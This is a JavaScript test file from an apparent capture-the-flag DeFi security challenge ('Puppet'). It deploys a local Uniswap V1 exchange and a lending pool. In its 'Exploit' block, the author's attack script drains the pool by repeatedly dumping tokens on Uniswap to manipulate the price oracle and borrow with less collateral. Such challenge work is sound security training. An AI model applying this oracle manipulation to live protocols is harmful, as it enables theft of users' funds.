const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
    return tokensSold.mul(ethers.BigNumber.from('997')).mul(etherInReserve).div(
        (tokensInReserve.mul(ethers.BigNumber.from('1000')).add(tokensSold.mul(ethers.BigNumber.from('997'))))
    )
}

describe('[Challenge] Puppet', function () {
    let deployer, attacker;

    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10');
    const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
    const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, attacker] = await ethers.getSigners();

        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const PuppetPoolFactory = await ethers.getContractFactory('PuppetPool', deployer);

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x15af1d78b58c40000", // 25 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        this.token = await DamnValuableTokenFactory.deploy();

        // Deploy a exchange that will be used as the factory template
        this.exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        this.uniswapFactory = await UniswapFactoryFactory.deploy();
        await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        let tx = await this.uniswapFactory.createExchange(this.token.address, { gasLimit: 1e6 });
        const { events } = await tx.wait();
        this.uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        this.lendingPool = await PuppetPoolFactory.deploy(
            this.token.address,
            this.uniswapExchange.address
        );
    
        // Add initial token and ETH liquidity to the pool
        await this.token.approve(
            this.uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapExchange.addLiquidity(
            0,                                                          // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
        );
        
        // Ensure Uniswap exchange is working as expected
        expect(
            await this.uniswapExchange.getTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                { gasLimit: 1e6 }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );
        
        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('2'));

        expect(
            await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'));
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */                                
        let attackerETHBalance = await ethers.provider.getBalance(attacker.address);                
        let borrowAmount = attackerETHBalance.div(2).sub(ethers.utils.parseEther('1'));

        let attackerDVTBalance;
        let poolDVTBalance;                
        
        // Borrow DVT until there is no more DVT left in the lending pool
        while (borrowAmount > 0) {
            attackerETHBalance = await ethers.provider.getBalance(attacker.address);                        
            attackerDVTBalance = await this.token.balanceOf(attacker.address);
            poolDVTBalance = await this.token.balanceOf(this.lendingPool.address);            

            
            // BORROW            
            // borrowAmount = attackerETHBalance.div(2).sub(ethers.utils.parseEther('1'));
            // let collateralAmount = await this.lendingPool.calculateDepositRequired(borrowAmount);

            borrowAmount = attackerETHBalance;
            let collateralAmount = await this.lendingPool.calculateDepositRequired(borrowAmount);

            // let collateralAmount = await this.lendingPool.calculateDepositRequired(borrowAmount);            
            // trying to find the right collateral amount by
            // decreasing borrow amount by 1 and calling lending pool's `calculateDepositRequired` again
            // since we will use the borrowed DVT to deposit on Uniswap Pool the oracle price of DVT/ETH
            // will change continiously            
            while (attackerETHBalance.lt(collateralAmount)) {                
                borrowAmount = borrowAmount.sub(ethers.utils.parseEther('1'));
                collateralAmount = await this.lendingPool.calculateDepositRequired(borrowAmount);                
            }            
            if (poolDVTBalance.lt(borrowAmount)) {
                borrowAmount = poolDVTBalance;
            }                                    

            let tx = await this.lendingPool.connect(attacker).borrow(            
                borrowAmount,
                {value: collateralAmount}
            );
            let block = await ethers.provider.getBlock('latest');                
            let minETHToReceive = await this.uniswapExchange.getTokenToEthInputPrice(
                attackerDVTBalance,
                { gasLimit: 1e6 }
            );      
            
            // approve Uniswap to transfer DVT from attacker to UNI Pool
            tx = await this.token.connect(attacker).approve(this.uniswapExchange.address, attackerDVTBalance);

            // TRADE DVT FOR ETH
            tx = await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
                attackerDVTBalance,        
                minETHToReceive,            
                ethers.BigNumber.from(block.timestamp + 300),
                { gasLimit: 100000 }
            );                                    
        }

        // exchage all of attacker's ETH to get the DVT
        // deposit ETH to get back DVT
        attackerETHBalance = await ethers.provider.getBalance(attacker.address);
        DVTOutputForETH = await this.uniswapExchange.getEthToTokenInputPrice(            
            attackerETHBalance.sub(ethers.utils.parseEther('1')),
            { gasLimit: 1e6 }
        ); 
                
        const lastBlock = await ethers.provider.getBlock(await ethers.provider.getBlockNumber());            
        const deadline = lastBlock.timestamp + 84600;        
        await this.uniswapExchange.connect(attacker).ethToTokenSwapOutput(            
            DVTOutputForETH,
            deadline,
            {value: attackerETHBalance.sub(ethers.utils.parseEther('1'))}
        );                

    }).timeout(-1);
        

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
         expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');
        
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE);
    
    }); 
    
});